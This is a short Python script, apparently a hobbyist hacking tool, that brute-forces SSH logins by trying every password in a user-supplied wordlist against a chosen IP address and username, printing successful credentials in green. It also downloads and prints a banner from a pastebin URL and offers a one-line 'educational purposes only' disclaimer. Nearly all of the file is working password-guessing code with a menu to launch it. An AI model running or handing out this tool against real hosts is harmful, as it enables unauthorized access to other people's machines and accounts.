import paramiko
import requests
from termcolor import colored

URL = "https://pastebin.com/raw/9sqcfR0Z"

def connect_with_username(username, password, ipaddress):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ipaddress, username=username, password=password)
        print(colored(f'Successful login: Username = {username}, Password = {password}', 'green'))
    except paramiko.AuthenticationException:
        print(colored(f'Failed login: Username = {username}, Password = {password}', 'red'))
    finally:
        ssh.close()

contents = requests.get(URL).text
print(colored(contents, 'magenta') + "\n")
print("[1] Launch")
print("[2] Disclaimer")
print("[3] Exit")

menu = int(input("\nChoose an option: "))

if menu == 1:
    ipaddress = input("\n[*] Insert the target's IP address (Example: 192.168.1.1): ")
    
    password_file = input("[*] Enter the name of the password file: ")
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()
    
    username = input("[*] Enter the SSH username: ")

    for password in passwords:
        connect_with_username(username, password, ipaddress)

elif menu == 2:
    print(colored("\nDisclaimer: This software is for educational purposes only.", "red"))

else:
    exit(0)
